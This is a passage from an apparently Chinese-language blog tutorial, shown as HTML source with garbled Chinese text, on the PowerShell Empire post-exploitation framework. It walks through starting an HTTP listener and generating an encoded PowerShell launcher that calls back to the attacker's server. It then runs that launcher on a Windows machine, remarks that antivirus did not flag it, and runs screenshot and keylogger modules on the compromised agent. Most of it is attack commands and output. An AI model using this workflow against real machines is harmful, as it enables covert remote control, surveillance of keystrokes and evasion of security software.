&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;positional arguments:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;server,client&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    server         Launch Empire Server
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    client         Launch Empire CLI
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;optional arguments:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -h, --help       show this &lt;span class=&#34;nb&#34;&gt;help&lt;/span&gt; message and &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¹Ÿå¯ä»¥ä½¿ç”¨GitHubè¿›è¡Œå®‰è£…æ–°ç‰ˆçš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/BC-SECURITY/Empire.git
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå®‰è£…Empireçš„ä¾èµ–ï¼Œå‘½ä»¤å¦‚ä¸‹:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; setup
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pip install -r requirements.txtï¼ˆè‹¥æ²¡æœ‰å®‰è£…pipåº“ï¼Œåˆ™éœ€è¦å…ˆé€šè¿‡apt-get install pipè¿›è¡Œå®‰è£…ï¼‰
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./install.sh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯åŠ¨çš„æ—¶å€™è¦å…ˆè¿è¡ŒæœåŠ¡å™¨ç«¯,è¿™ä¸ªå°±æœ‰ç‚¹ç±»ä¼¼äºå‘½ä»¤è¡Œç‰ˆæœ¬çš„csï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo powershell-empire server
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶ååœ¨å¯åŠ¨å®¢æˆ·ç«¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo powershell-empire client
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™ä¸ªè·Ÿç½‘ä¸Šçš„é‚£äº›ç‰ˆæœ¬æœ‰å¾ˆå¤§çš„æ”¹å˜ï¼Œæ–‡ç« ä¹Ÿå¾ˆå°‘æœ‰æ›´æ–°çš„ï¼Œä¸»è¦è¿˜æ˜¯çœ‹å®˜ç½‘çš„æ–‡æ¡£ä¸ºä¸»ï¼š&lt;a href=&#34;https://bc-security.gitbook.io/empire-wiki/&#34;&gt;empire-wiki&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä¹¦ä¸­æœ‰å¾ˆå¤šå·²ç»ä¸èƒ½åœ¨å®æˆ˜ä¸­ä½¿ç”¨äº†ï¼Œå› ä¸ºè¿™æ¬¾å·¥å…·è·Ÿmsfå·®ä¸å¤šï¼Œä¸»è¦æ˜¯åæ¸—é€çš„ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ç›‘å¬ä¸Šçº¿&#34;&gt;ç›‘å¬ä¸Šçº¿&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆåœ¨&lt;code&gt;client&lt;/code&gt;ç«¯è¿›è¡Œå‘½ä»¤æ“ä½œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;help&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»¥ä¸‹é€‰é¡¹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//7.png&#34; alt=&#34;image-20220119125954348&#34;&gt;&lt;/p&gt;
&lt;p&gt;åŠŸèƒ½æˆ‘å°±ä¸å¤šä»‹ç»äº†ï¼Œè·Ÿcsä¹Ÿå·®ä¸å¤šï¼Œåªæ˜¯å‘½ä»¤è¡Œæ¨¡å¼çš„è€Œå·²ï¼Œæˆ‘ä»¬å…ˆæ¥å»ºç«‹ä¸€ä¸ªç›‘å¬æ¨¡å—ï¼Œä½¿ç”¨&lt;code&gt;uselisteners&lt;/code&gt; æŒ‰ä¸‹tabå¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šé€‰é¡¹ï¼Œè¿™é‡Œå°±é€‰æ‹©httpæ¥ä½œä¸ºæ¼”ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//8.png&#34; alt=&#34;image-20220119130945523&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿›å…¥httpçš„ç›‘å¬æ¨¡å¼åå¯ä»¥è¾“å…¥ä¸‹é¢çš„å‘½ä»¤è¿›è¡ŒæŸ¥çœ‹éœ€è¦è®¾ç½®çš„é€‰é¡¹:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: uselistener/http&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; options
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™é‡Œæˆ‘ä»¬è®¾ç½®ç›‘å¬åç§°ã€IPï¼ˆè¿™ä¸ªæ˜¯kaliçš„IPï¼Œä¹Ÿå°±æ˜¯ä½ çš„empireæœåŠ¡ç«¯çš„IPï¼‰ã€ç«¯å£å°±è¡Œäº†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: uselistener/http&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; Name &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Name to &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: uselistener/http&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; Host 172.16.0.107
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Host to 172.16.0.107
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: uselistener/http&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; Port &lt;span class=&#34;m&#34;&gt;8888&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Port to &lt;span class=&#34;m&#34;&gt;8888&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: uselistener/http&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Listener &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; successfully started
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæˆ‘ä»¬è¾“å…¥&lt;code&gt;back&lt;/code&gt;å°±å¯ä»¥è¿”å›ä¸Šä¸€å±‚ï¼Œè¾“å…¥&lt;code&gt;listeners&lt;/code&gt;æŸ¥çœ‹ç›‘å¬çš„ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ID&lt;/th&gt;
&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Module&lt;/th&gt;
&lt;th&gt;Listener Category&lt;/th&gt;
&lt;th&gt;Created At&lt;/th&gt;
&lt;th&gt;Enabled&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;test&lt;/td&gt;
&lt;td&gt;http&lt;/td&gt;
&lt;td&gt;client_server&lt;/td&gt;
&lt;td&gt;2022-01-19 13:14:56 CST (3 minutes ago)&lt;/td&gt;
&lt;td&gt;True&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;ä¸‹ä¸€æ­¥å°±æ˜¯ç”Ÿæˆæœ¨é©¬äº†ï¼Œåˆ©ç”¨çš„åŠŸèƒ½æ˜¯&lt;code&gt;usestager&lt;/code&gt;ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æœ‰å¾ˆå¤šå¯ä»¥é€‰æ‹©ï¼Œç±»ä¼¼msfçš„payloadä¸€æ ·ã€‚&lt;/p&gt;
&lt;p&gt;ä¹¦ä¸­è®²äº†DLLã€VBSç­‰åˆ©ç”¨æ–¹å¼ï¼Œå…¶å®éƒ½è·Ÿmsfåˆ©ç”¨å·®ä¸å¤šï¼Œä½†æ˜¯æœ‰ä¸€æ ·æ˜¯æ”¹å˜äº†ï¼Œæ¯”å¦‚&lt;code&gt;launcher&lt;/code&gt;,ä¹¦ä¸­æ˜¯ç›´æ¥åœ¨&lt;code&gt;listeners&lt;/code&gt;ç•Œé¢æ‰§è¡Œ&lt;code&gt;launcher powershel test&lt;/code&gt;,åœ¨æ–°ç‰ˆå°±æ²¡æœ‰è¿™ä¸ªæ‰§è¡Œæ–¹å¼äº†ï¼Œç›´æ¥å°±æ˜¯åˆ©ç”¨ä¸‹é¢çš„&lt;code&gt;multi/launcher&lt;/code&gt;å°±è¡Œäº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬åªéœ€è¦è¿›å…¥è¯¥æ¨¡å—ï¼Œç„¶åè®¾ç½®ç›‘å¬çš„é€‰é¡¹å°±å¯ä»¥äº†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usestager/multi/launcher&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; Listener &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Listener to &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usestager/multi/launcher&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;powershell -noP -sta -w &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAG8AbgBUAGEAYgBMAGUALgBQAFMAVgBFAFIAcwBJAG8ATgAuAE0AQQBKAG8AcgAgAC0ARwBFACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAEYAXQAuAEEAcwBzAGUATQBCAEwAWQAuAEcARQB0AFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALg...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;AEEAVABBAC4ATABlAG4ARwBUAEgAXQA7AC0ASgBPAEkAbgBbAEMAaABBAHIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usestager/multi/launcher&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‹é¢æˆ‘ä»¬æŠŠè¿™æ¡powershellçš„å¤åˆ¶åˆ°æˆ‘ä»¬çš„Windowsä¸­æ‰§è¡Œï¼Œå¯ä»¥çœ‹åˆ°ç«ç»’æ²¡æœ‰æŠ¥æ¯’ï¼Œæ‰§è¡Œæœ‰ä¸€ä¸ªæé†’æ‹¦æˆªçš„æç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//10.png&#34; alt=&#34;10&#34;&gt;&lt;/p&gt;
&lt;p&gt;å›åˆ°æˆ‘ä»¬çš„empireä¸­å¯ä»¥çœ‹åˆ°å·²ç»ä¸Šçº¿äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//11.png&#34; alt=&#34;11&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;è¿æ¥ä¸»æœºåŠä¿¡æ¯æ”¶é›†&#34;&gt;è¿æ¥ä¸»æœºåŠä¿¡æ¯æ”¶é›†&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬è¿›å…¥&lt;code&gt;agents&lt;/code&gt;æ¨¡å¼ä¹‹åï¼Œé€‰æ‹©è¿›å…¥å…¶ä¸­ä¸€å°ä¸»æœºè¿›è¡Œæ“ä½œï¼Œå¯ä»¥ä½¿ç”¨shell+åŸºç¡€å‘½ä»¤ï¼Œæˆ–è€…è¾“å…¥&lt;code&gt;help&lt;/code&gt;æŸ¥çœ‹å¯æ‰§è¡Œçš„å‘½ä»¤ï¼Œåœ¨æ­¤å°±ä¸å†å¤šé˜è¿°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//12.png&#34; alt=&#34;12&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;å±å¹•æˆªå›¾&#34;&gt;å±å¹•æˆªå›¾&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: Y35E4PR8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; usemodule powershell/collection/screenshot
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Agent to Y35E4PR8
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Author       @obscuresec                                                            
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              @harmj0y                                                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Background   False                                                                  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Comments     https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              /Get-TimedScreenshot.ps1                                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Description  Takes a screenshot of the current desktop and returns the output as a  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              .PNG.                                                                  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Language     powershell                                                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Name         powershell/collection/screenshot                                       
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; NeedsAdmin   False                                                                  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; OpsecSafe    True                                                                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Techniques   http://attack.mitre.org/techniques/T1113                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”ŒRecord Optionsâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Name  â”‚ Value    â”‚ Required â”‚ Description                       â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Agent â”‚ Y35E4PR8 â”‚ True     â”‚ Agent to run module on.           â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Ratio â”‚          â”‚ False    â”‚ JPEG Compression ratio: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; to 100. â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/collection/screenshot&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/collection/screenshot&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;é”®ç›˜è®°å½•&#34;&gt;é”®ç›˜è®°å½•&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: Y35E4PR8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; usemodule powershell/collection/keylogger
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Agent to Y35E4PR8
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Author       @obscuresec                                                            
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              @mattifestation                                                        
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              @harmj0y                                                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Background   True                                                                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Comments     https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              /Get-Keystrokes.ps1                                                    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Description  Logs keys pressed, &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt; and the active window &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;when changed&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to the    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              keystrokes.txt file. This file is located in the agents downloads      
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              directory Empire/downloads/&amp;lt;AgentName&amp;gt;/keystrokes.txt.                 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Language     powershell                                                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Name         powershell/collection/keylogger                                        
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; NeedsAdmin   False                                                                  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; OpsecSafe    True                                                                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Techniques   http://attack.mitre.org/techniques/T1056                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
